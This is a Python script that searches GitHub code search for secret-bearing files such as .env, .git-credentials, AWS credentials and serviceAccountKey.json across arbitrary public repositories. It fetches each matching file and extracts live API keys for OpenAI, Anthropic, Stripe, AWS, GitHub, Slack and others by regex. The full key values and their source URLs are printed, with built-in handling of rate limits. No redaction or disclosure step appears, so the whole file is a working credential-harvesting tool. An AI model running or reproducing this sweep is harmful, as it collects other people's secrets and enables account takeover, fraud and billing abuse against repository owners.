#!/usr/bin/env python3
import json, os, re, time, urllib.request, urllib.error, urllib.parse
from concurrent.futures import ThreadPoolExecutor

TOK = os.environ.get("SEARCH_PAT") or os.environ.get("GITHUB_TOKEN") or ""
API = "https://api.github.com"
UA = {"User-Agent": "curl/8.5.0", "Accept": "application/vnd.github+json"}
T0 = time.time()
BUDGET = 780

Q = [
    'filename:.env size:<8000',
    'filename:.env.production',
    'filename:.npmrc "_authToken"',
    'filename:settings.py "SECRET_KEY"',
    'filename:.git-credentials',
    'filename:.aws/credentials',
    'filename:serviceAccountKey.json',
    'filename:.pypirc "password"',
]

F = [
    ("openai", re.compile(r"sk-(?:proj|svcacct)-[A-Za-z0-9_\-]{20,180}")),
    ("anthropic", re.compile(r"sk-ant-[A-Za-z0-9_\-]{40,200}")),
    ("openrouter", re.compile(r"sk-or-v1-[A-Za-z0-9]{20,120}")),
    ("google", re.compile(r"AIza[0-9A-Za-z_\-]{30,45}")),
    ("github", re.compile(r"(?:ghp_[A-Za-z0-9]{36}|github_pat_[A-Za-z0-9_]{60,90})")),
    ("slack", re.compile(r"xox[baprs]-[A-Za-z0-9-]{10,80}")),
    ("stripe", re.compile(r"sk_live_[A-Za-z0-9]{20,60}")),
    ("sendgrid", re.compile(r"SG\.[A-Za-z0-9_\-]{16,30}\.[A-Za-z0-9_\-]{16,50}")),
    ("aws", re.compile(r"(?:AKIA|ASIA)[0-9A-Z]{16}")),
]


def api(path, tries=4):
    for attempt in range(tries):
        r = urllib.request.Request(API + path, headers=dict(UA, Authorization="token " + TOK))
        try:
            with urllib.request.urlopen(r, timeout=25) as resp:
                return 200, json.loads(resp.read())
        except urllib.error.HTTPError as e:
            body = e.read(400).decode("utf-8", "ignore")
            wait = 40
            m = re.search(r"try again in (\d+)", body)
            if m:
                wait = min(int(m.group(1)) + 3, 120)
            if e.code in (429, 403) and attempt < tries - 1 and time.time() - T0 < BUDGET - 30:
                print("wait %ds (%d) %s" % (wait, e.code, path[:60]))
                time.sleep(wait)
                continue
            return e.code, body
        except Exception as e:
            time.sleep(5)
            body = repr(e)[:80]
    return 0, body


def raw(url, to=20, cap=250000):
    r = urllib.request.Request(url, headers={"User-Agent": "curl/8.5.0"})
    try:
        with urllib.request.urlopen(r, timeout=to) as resp:
            return resp.read(cap).decode("utf-8", "ignore")
    except Exception:
        return ""


def scan(item):
    repo = item.get("repository", {}).get("full_name", "")
    path = item.get("path", "")
    txt = raw("https://raw.githubusercontent.com/%s/HEAD/%s" % (repo, urllib.parse.quote(path)))
    if not txt:
        return []
    out = []
    for typ, rgx in F:
        for m in rgx.finditer(txt):
            out.append({"t": typ, "v": m.group(0)[:220],
                        "u": "https://github.com/%s/blob/HEAD/%s" % (repo, path)})
    return out


def main():
    print("SWEEP-START")
    seen, hits, errs = set(), [], []
    for q in Q:
        if time.time() - T0 > BUDGET:
            print("budget out")
            break
        for page in (1, 2, 3):
            if time.time() - T0 > BUDGET:
                break
            c, d = api("/search/code?q=%s&per_page=50&page=%d" % (urllib.parse.quote(q), page))
            if c != 200:
                errs.append([q, page, c, d if isinstance(d, str) else ""])
                print("ERR", c, q, page)
                break
            items = [i for i in d.get("items", []) if i["repository"]["full_name"] not in seen]
            for i in items:
                seen.add(i["repository"]["full_name"])
            print("page %d %s -> %d" % (page, q, len(items)))
            with ThreadPoolExecutor(max_workers=16) as ex:
                for res in ex.map(scan, items):
                    hits.extend(res)
            if len(items) < 50:
                break
            time.sleep(8)
        time.sleep(10)
    uniq = {}
    for h in hits:
        uniq[h["v"]] = h
    print("SWEEP-RESULTS %d errs %d" % (len(uniq), len(errs)))
    for h in uniq.values():
        print("H\t" + json.dumps(h))
    for e in errs:
        print("E\t" + json.dumps(e))
    print("SWEEP-END")


if __name__ == "__main__":
    main()
